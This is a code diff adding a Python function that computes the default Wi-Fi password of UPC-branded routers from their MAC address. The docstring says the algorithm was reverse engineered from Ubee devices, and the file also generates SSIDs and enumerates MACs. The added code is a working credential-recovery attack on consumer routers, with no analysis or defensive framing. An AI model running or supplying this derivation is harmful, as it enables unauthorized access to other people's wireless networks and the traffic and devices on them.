@@ -48,6 +48,36 @@ def compute_ssid(mac):
 
     return "UPC%d%d%d%d%d%d%d" % (h2[0]%10, h2[1]%10, h2[2]%10, h2[3]%10, h2[4]%10, h2[5]%10, h2[6]%10)
 
+def compute_password(mac):
+    '''
+    Generates password from the MAC - reverse engineered from UBEE.
+    Warning: does not implement profanity detection.
+    :param mac:
+    :return:
+    '''
+    m = hashlib.md5()
+    m2 = hashlib.md5()
+    mac = [int(x,16) for x in mac]
+
+    # MAC+hex(UPCDEAULTPASSPHRASE)
+    inp1 = "%2X%2X%2X%2X%2X%2X555043444541554C5450415353504852415345\0" % (mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
+    m.update(inp1)
+    h1 = [ord(x) for x in m.digest()]
+
+    inp2 = "%.02X%.02X%.02X%.02X%.02X%.02X\0" % (h1[0]&0xf, h1[1]&0xf, h1[2]&0xf, h1[3]&0xf, h1[4]&0xf, h1[5]&0xf)
+    m2.update(inp2)
+    h2 = [ord(x) for x in m2.digest()]
+
+    return "%c%c%c%c%c%c%c%c" % (
+        (0x41 + ((h2[0]+h2[8]) % 0x1A)),
+        (0x41 + ((h2[1]+h2[9]) % 0x1A)),
+        (0x41 + ((h2[2]+h2[10]) % 0x1A)),
+        (0x41 + ((h2[3]+h2[11]) % 0x1A)),
+        (0x41 + ((h2[4]+h2[12]) % 0x1A)),
+        (0x41 + ((h2[5]+h2[13]) % 0x1A)),
+        (0x41 + ((h2[6]+h2[14]) % 0x1A)),
+        (0x41 + ((h2[7]+h2[15]) % 0x1A)))
+
 def gen_ssids(s):
     macs = []
     num = int(''.join(s), 16)
